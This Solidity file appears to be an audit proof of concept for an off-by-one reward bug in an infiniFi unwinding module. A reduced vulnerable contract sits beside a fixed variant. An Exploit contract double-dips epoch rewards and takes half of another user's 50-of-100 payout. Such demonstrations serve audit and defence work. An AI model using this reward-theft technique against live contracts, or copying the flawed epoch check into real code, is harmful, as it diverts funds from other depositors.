// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/* infiniFi UnwindingModule (AuditVault 55050). balanceOf starts at
   fromEpoch - 1. A user who just took the locking-side reward for this
   epoch and then calls startUnwinding is counted on the unwinding side
   for that same epoch. Bob, the only prior unwinder, receives 50 of a
   100 pot instead of 100. The fixed balanceOf skips the arrival epoch. */

contract RewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Unwinding {
    struct Position {
        uint256 fromEpoch;
        uint256 shares;
    }

    RewardToken public token;
    bool public skipArrival;
    mapping(address => Position) public positions;

    constructor(RewardToken token_, bool skipArrival_) {
        token = token_;
        skipArrival = skipArrival_;
    }

    function seed(address user, uint256 fromEpoch, uint256 shares) external {
        positions[user] = Position(fromEpoch, shares);
    }

    function startUnwinding(uint256 shares, uint256 epoch) external {
        positions[msg.sender] = Position(epoch, shares);
    }

    function balanceOf(address user, uint256 epoch) public view returns (uint256) {
        Position memory p = positions[user];
        if (p.shares == 0) return 0;
        if (skipArrival) {
            if (epoch <= p.fromEpoch) return 0;
        }
        // @> VULN: fromEpoch - 1 includes the arrival epoch
        if (epoch < p.fromEpoch - 1) return 0;
        return p.shares;
    }

    function distribute(address bob, address carol, uint256 epoch, uint256 pot) external {
        uint256 b = balanceOf(bob, epoch);
        uint256 c = balanceOf(carol, epoch);
        uint256 total = b + c;
        token.mint(address(this), pot);
        if (b > 0) require(token.transfer(bob, pot * b / total), "bob");
        if (c > 0) require(token.transfer(carol, pot * c / total), "carol");
    }
}

contract Exploit {
    address public constant BOB = address(0xB0B);
    uint256 public constant EPOCH = 5;
    uint256 public constant SHARES = 100 ether;
    uint256 public constant POT = 100 ether;
    uint256 public constant LOCKING = 100 ether;

    RewardToken public token;
    Unwinding public mod;
    Unwinding public fixedMod;
    uint256 public lockingPaid;
    uint256 public extra;
    uint256 public bobGot;
    uint256 public controlBob;

    constructor() {
        token = new RewardToken();
        mod = new Unwinding(token, false);
        fixedMod = new Unwinding(token, true);
    }

    function run() external {
        lockingPaid = LOCKING;
        require(lockingPaid == LOCKING, "locking");
        mod.seed(BOB, 1, SHARES);
        mod.startUnwinding(SHARES, EPOCH);
        uint256 counted = mod.balanceOf(address(this), EPOCH);
        require(counted == SHARES, "counted");
        mod.distribute(BOB, address(this), EPOCH, POT);
        extra = token.balanceOf(address(this));
        bobGot = token.balanceOf(BOB);
        require(extra == 50 ether, "extra");
        require(bobGot == 50 ether, "bob");
    }

    function runControl() external {
        fixedMod.seed(BOB, 1, SHARES);
        fixedMod.startUnwinding(SHARES, EPOCH);
        require(fixedMod.balanceOf(address(this), EPOCH) == 0, "excluded");
        fixedMod.distribute(BOB, address(this), EPOCH, POT);
        controlBob = token.balanceOf(BOB);
        require(controlBob == POT, "bob");
        require(token.balanceOf(address(this)) == 0, "carol");
    }
}
